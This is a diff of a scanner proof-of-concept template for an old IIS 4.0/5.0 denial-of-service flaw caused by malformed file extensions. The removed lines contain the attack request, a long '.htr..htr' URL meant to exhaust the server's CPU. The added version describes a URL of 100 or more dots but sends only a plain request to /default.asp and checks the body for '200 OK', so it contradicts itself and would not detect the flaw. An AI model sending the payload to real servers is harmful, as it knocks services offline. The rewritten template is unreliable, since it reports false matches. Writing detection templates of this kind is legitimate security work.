@@ -1,10 +1,10 @@
 [info]
-author = "AVE"
-description = "Microsoft IIS 4.0/5.0 畸形文件扩展名拒绝服务漏洞验证。向目标发送包含大量伪造文件扩展名的超长URL，触发IIS扩展名解析异常，导致CPU占用100%使服务崩溃。"
+author = "ave"
+description = "通过向 IIS 4.0/5.0 发送包含 100 个以上连续点的超长 URL，触发 IIS 文件扩展名解析时呈指数级计算的 MIME 类型匹配，导致 CPU 耗尽、服务停止响应，造成拒绝服务。"
 id = "POC-AVE-2000-0335"
-name = "CVE-2000-0408 PoC"
-severity = "medium"
-tags = ["cve-2000-0408"]
+name = "Microsoft IIS 4.0/5.0 恶意文件扩展名拒绝服务 PoC"
+severity = "high"
+tags = ["ave-2000-0335"]
 vuln_id = [
     "CVE-2000-0408",
     "AVE-2000-0335",
@@ -15,15 +15,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/.htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr"
+path = "/{{BaseURL}}/default.asp"
 protocol = "http"
+
+[poc.requests.body]
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
-status = [
-    500,
-    503,
-    502,
-]
-type = "status"
+type = "word"
+words = ["200 OK"]
